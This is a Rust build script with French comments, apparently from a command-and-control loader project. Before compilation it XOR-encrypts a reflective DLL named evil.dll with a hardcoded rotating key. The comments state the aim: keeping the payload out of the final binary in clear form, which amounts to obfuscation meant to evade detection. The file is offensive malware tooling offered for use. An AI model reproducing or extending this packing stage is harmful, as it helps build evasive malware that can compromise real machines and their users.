// ============================================================
// BUILD SCRIPT - Chiffre la DLL au compile-time
// ============================================================
// Ce script s'execute AVANT la compilation du loader
// Il chiffre evil.dll avec XOR et genere evil.dll.enc
// Ainsi, le binaire final ne contient pas la DLL en clair

use std::env;
use std::fs;
use std::path::Path;

// Cle XOR - DOIT correspondre a celle dans main.rs
const XOR_KEY: &[u8] = b"Fr4m3w0rkC2_K3y!"; // 16 bytes

fn main() {
    let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap();
    let dll_path = Path::new(&manifest_dir).join("../reflective_dll/evil.dll");
    let enc_path = Path::new(&manifest_dir).join("../reflective_dll/evil.dll.enc");

    // Recompiler si la DLL change
    println!("cargo:rerun-if-changed=../reflective_dll/evil.dll");

    // Lire la DLL
    let dll_bytes = match fs::read(&dll_path) {
        Ok(bytes) => bytes,
        Err(e) => {
            eprintln!("Warning: Could not read evil.dll: {}", e);
            return;
        }
    };

    // Chiffrer avec XOR (cle rotative)
    let encrypted: Vec<u8> = dll_bytes
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ XOR_KEY[i % XOR_KEY.len()])
        .collect();

    // Ecrire le fichier chiffre
    fs::write(&enc_path, &encrypted).expect("Failed to write encrypted DLL");
}
